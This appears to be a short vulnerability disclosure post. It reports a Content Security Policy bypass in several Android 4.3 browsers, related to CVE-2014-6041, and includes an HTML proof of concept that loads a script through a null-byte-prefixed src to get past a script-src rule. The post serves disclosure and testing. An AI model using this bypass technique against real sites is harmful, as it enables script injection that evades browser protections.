
I&#039;ve found a Content Security Policy bypass similar to the same and related to the same origin policy bypass in this CVE. This is a separate vulnerability, however.
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6041

I&#039;ve tested this on an Android 4.3 tablet. I&#039;ve tested this and it works on Firefox (32.0.2), InBrowser, Dolphin (App info doesn&#039;t give version). I also tested the default android browser on 4.3.1 emulator which was also vulnerable.

PoC:
<input type=button value="test" onclick="
  a=document.createElement(&#039;script&#039;);
  a.id=&#039;AA&#039;;
  a.src=&#039;\u0000https://js.stripe.com/v2/&#039;;
  document.body.appendChild(a);
  setTimeout(function(){if(typeof(document.getElementById(&#039;AA&#039;))!==&#039;undefined&#039;){alert(Stripe);}else{ alert(2);}}, 400);
  return false;">

The content security policy rule that should block this is 
script-src &#039;self&#039; https://js.stripe.com/v2/ ;

The PoC worked if you see a popup containing stripes e(){} object. You can test this on http://ejj.io/test.php
